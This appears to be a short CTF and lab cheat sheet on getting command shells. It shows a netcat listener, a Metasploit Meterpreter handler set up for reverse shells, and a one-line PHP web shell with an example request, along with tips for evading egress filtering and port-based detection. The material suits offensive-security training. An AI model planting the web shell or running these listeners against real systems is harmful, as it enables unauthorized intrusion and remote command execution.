# Shells
For most lab or CTF environments, the goal is to get some kind of command shell on the machine for further exploitation. Sometimes this simply means discovering SSH or remote desktop credentials and logging in. Other times, it's exploiting the web application itself to generate a reverse shell that connects to your attack machine and waits for instructions.

In real life I'm not sure how often reverse shells really happen, but they're fun to pull off in the lab.

[This is a good primer on shells](https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/) 

## Listeners
Your attack machine needs to have a listener running to catch a reverse shell connection. Make sure you specify the IP address of your attack machine and use a port that doesn't already have a service listening. If you need to use `python SimpleHTTPServer` or similar to transfer exploits, make sure that isn't running on the same port. 

### Netcat listener
Using ports 80 or 443 will help you get around egress filtering:
```
nc -lvp 443
```
### Meterpreter listener
You may prefer a Meterpreter listener if you're connecting to a Windows machine and want to take advantage of commands like `getsystem`, or you want to use local Metasploit exploits once you've connected to the remote machine.

Avoid using port 4444 since that is widely recognized as a Metasploit port:
```
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp # or whatever
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost [attack machine] # your IP address
lhost => [attack machine]
msf exploit(handler) > set lport 443
lport => 443
msf exploit(handler) > run
```

## Simple PHP web shell
Assuming you are able to put a file on the web server or edit an existing one (e.g. CMS template) this is the simplest type of shell:

```
<?php echo shell_exec($_GET['cmd']); ?>
```
You can use it for system commands: 
```
http://127.0.0.1/wordpress/index.php?cmd=id
```
